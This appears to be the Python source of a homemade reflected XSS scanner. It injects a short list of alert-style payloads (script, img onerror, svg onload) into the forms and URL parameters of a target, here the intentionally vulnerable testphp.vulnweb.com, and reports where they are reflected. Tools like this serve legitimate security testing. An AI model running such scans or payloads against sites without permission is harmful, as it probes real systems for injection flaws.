import urllib.parse
from urllib.parse import urlparse, parse_qs
import requests
import validators
from .forms import *
from bs4 import BeautifulSoup as bs

string_terminators = ["", "'", ";", "';", ]

payloads = ["<script>alert(1)</script>", "<img src=X onerror=alert(1)/>", "<svg onload=alert('XSS')>"]

unique_string = "Approx is knocking"

vulnerable_links = []


class xss_scanner:
    exploited_urls = []
    escape_chars = ["'", '">', ";"]

    def __init__(self, url, cookies=None, headers=None):
        self.url = url
        self.cookies = cookies,
        self.headers = headers,

    def check_url(self):
        return validators.url(self.url)

    def set_url(self, new_url):
        self.url = new_url

    def in_attrs(self, highString):
        # If this method returns true try the payloads combined with escape sequences.
        value_Tags = ["li", "a", "button", "input"]
        reflecteds = []
        unique_value = highString
        formlist = forms.get_forms(self.url, self.cookies)
        for each_form in formlist:
            final = forms.submit(each_form, unique_value)
            if unique_value in final[0]:
                html_content = final[0]
                content_parser = bs(html_content, "html.parser")

                for tag in value_Tags:
                    reflecteds.extend(content_parser.find_all(tag))

                for reflection in reflecteds:
                    if reflection.get("value") is not None or reflection.get("href") is not None:
                        if reflection.get("value") == unique_value or unique_value in reflection.get("href"):
                            return True
        return False

    def has_parameters(self):
        if self.check_url():
            parsed_url = urlparse(self.url)
            query = parsed_url.query
            parameters = parse_qs(query)
            if bool(parameters) is False and parameters is not None:
                return False
            else:
                return True

    def reflected_xss(self):
        if self.has_parameters():
            parsed_url = urlparse(self.url)
            query = parsed_url.query
            parameters = parse_qs(query)

            for parameter in parameters:
                parameters[parameter] = parameters[parameter][0]

            for parameter in parameters:
                current_Value = parameters[parameter]
                for P in payloads:
                    parameters[parameter] = P
                    new_parts = list(parsed_url)
                    new_parts[4] = urllib.parse.urlencode(parameters)
                    build_url = urllib.parse.urlunparse(new_parts)
                    data = requests.get(build_url).text
                    if P in data:
                        print("Reflected XSS found at {} triggered with {}".format(self.url, P))
                        break
                parameters[parameter] = current_Value

    def main(self):
        formslist = forms.get_forms(url=self.url, cookies=self.cookies[0])
        for form in formslist:
            for P in payloads:
                response = forms.submit(url=self.url, form_specs=form, payload=P, cookies=self.cookies[0])
                if P in response[0].decode():
                    if response[1] not in vulnerable_links:
                        print("XSS Found at {} endpoint triggered with {} payload".format(response[1], P))
                        vulnerable_links.append(response[1])
                        break
                else:
                    self.reflected_xss()


if __name__ == '__main__':
    scanner = xss_scanner(url="http://testphp.vulnweb.com/userinfo.php", cookies={"login":"test/test"})
    scanner.main()


